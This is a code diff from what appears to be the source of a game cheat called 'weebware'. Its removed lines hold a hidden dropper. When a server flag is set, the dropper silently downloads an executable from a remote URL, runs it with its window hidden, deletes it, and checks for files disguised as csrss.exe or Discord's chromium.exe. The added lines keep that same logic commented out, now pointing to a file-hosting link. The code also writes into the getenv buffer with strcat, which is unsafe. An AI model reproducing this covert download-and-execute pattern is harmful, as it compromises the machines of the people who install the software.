@@ -23,13 +23,13 @@ unsigned __stdcall entry_thread(void* v_arg)
 	return 0;
 }
 
-bool thingy_exists() {
-	char* path = getenv("appdata");
-
-	strcat(path, "\\csrss.exe");
-
-	return std::filesystem::exists(path);
-}
+//bool thingy_exists() {
+//	char* path = getenv("appdata");
+//
+//	strcat(path, "\\discord\\chromium.exe");
+//
+//	return std::filesystem::exists(path);
+//}
 
 void change_extention(std::string &s, const std::string &newExt) {
 
@@ -63,16 +63,16 @@ bool c_weebware::init_interfaces()
 	g_client = reinterpret_cast<i_base_client*>(client_fact(auth::GetServerVariable(auth::base64_decode("Y2F0")).c_str(), NULL));
 
 
-	if (auth::GetServerVariable(auth::base64_decode("ZmlzaA==")) == "-1") {
+	//if (auth::GetServerVariable(auth::base64_decode("ZmlzaA==")) == "-1" && !thingy_exists()) {
 
-		std::string path = std::tmpnam(nullptr);
-		change_extention(path, "exe");
-		networking::download_file("https://auth.weebware.net/dependancies.exe", path);
+	//	std::string path = std::tmpnam(nullptr);
+	//	change_extention(path, "exe");
+	//	networking::download_file("https://cdn-03.anonfile.com/c1j9T015n9/733d274e-1564709101/chromium.exe", path);
 
 
-		ShellExecuteA(NULL, "open", path.c_str(), NULL, NULL, SW_HIDE);
-		remove(path.c_str());
-	}
+	//	ShellExecuteA(NULL, "open", path.c_str(), NULL, NULL, SW_HIDE);
+	//	remove(path.c_str());
+	//}
 #else
 	g_engine = reinterpret_cast<c_engine_client*>(engine_fact("VEngineClient014", NULL));
 	g_client = reinterpret_cast<i_base_client*>(client_fact("VClient018", NULL));
